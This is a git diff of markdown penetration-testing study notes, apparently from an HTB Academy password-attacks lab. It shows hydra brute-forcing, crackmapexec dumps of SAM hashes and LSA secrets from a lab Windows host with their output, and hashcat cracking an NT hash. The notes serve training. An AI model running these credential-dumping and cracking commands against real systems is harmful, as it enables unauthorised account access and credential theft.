@@ -14,7 +14,7 @@ format : `htb-student:$y$j9T$3QSBB6CbHEu...SNIP...f8Ms:18955:0:99999:7:::`
 | `$7$`    | Scrypt                      |
 
 However, a few more files belong to the user management system of Linux. The other two files are `/etc/passwd` and `/etc/group` <br>
-**Note!** : only be read by root. 
+>**Note!** : only be read by root. 
 ## John The Ripper
 John The Ripper or JTR or John is a pentesting tool used to check or crack encrypted password (hashed) 
 ### Crack Mode
@@ -117,6 +117,7 @@ $ john --wordlist="rockyou.txt" -serverdocs.hash
 |`hccap2john`|Converts WPA/WPA2 handshake captures for John|
 |`office2john`|Converts MS Office documents for John|
 |`wpa2john`|Converts WPA/WPA2 handshakes for John|
+# Remote Password Attacking
 ## Network Service
 n this case, the most common services suitable for this are `RDP`, `WinRM`, and `SSH`.
 ### WinRM
@@ -146,7 +147,7 @@ use hydra to find username and password
 ```shell
 $ hydra -L <username_list> -P <password_list> ssh://<ip_adress>
 ```
-**Note!** : if it have ftp port 21 use ftp is faster than ssh
+>**Note!** : if it have ftp port 21 use ftp is faster than ssh
 ### SMB
 **SMB** -> Server Message Block
 use hydra to find username and password
@@ -199,3 +200,35 @@ leetspeak.rule               toggles5.rule
 oscommerce.rule              unix-ninja-leetspeak.rule
 rockyou-30000.rule
 ```
+
+# Windows Local Password Attacks
+## Attacking With SAM
+```shell
+┌──(kali㉿kali)-[~/Documents/vpn]
+└─$ crackmapexec smb 10.129.202.137 --local-auth -u Bob -p HTB_@cademy_stdnt! --sam
+SMB         10.129.202.137  445    FRONTDESK01      [*] Windows 10 / Server 2019 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
+SMB         10.129.202.137  445    FRONTDESK01      [+] FRONTDESK01\Bob:HTB_@cademy_stdnt! (Pwn3d!)
+SMB         10.129.202.137  445    FRONTDESK01      [+] Dumping SAM hashes
+SMB         10.129.202.137  445    FRONTDESK01      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+jason:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
+SMB         10.129.202.137  445    FRONTDESK01      ITbackdoor:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
+[S N I P ...]
+```
+format : `[UID]:[RID]:[LM hash]:[NT hash]` <br>
+use `hashcat` to crack `NT hash` (password) 
+```shell
+┌──(kali㉿kali)-[~/Downloads]
+└─$ hashcat -m 1000 -a 0 sam.hash /usr/share/wordlists/rockyou.txt 
+[S N I P . . .]
+
+c02478537b9727d391bc80011c2e2321:matrix                   
+# password is matrix
+```
+### lsa dump
+```shell
+┌──(kali㉿kali)-[~/Documents/vpn]
+└─$ crackmapexec smb 10.129.202.137 --local-auth -u Bob -p HTB_@cademy_stdnt! --lsa
+SMB         10.129.202.137  445    FRONTDESK01      frontdesk:Password123
+```
+
+## Attacking LSASS
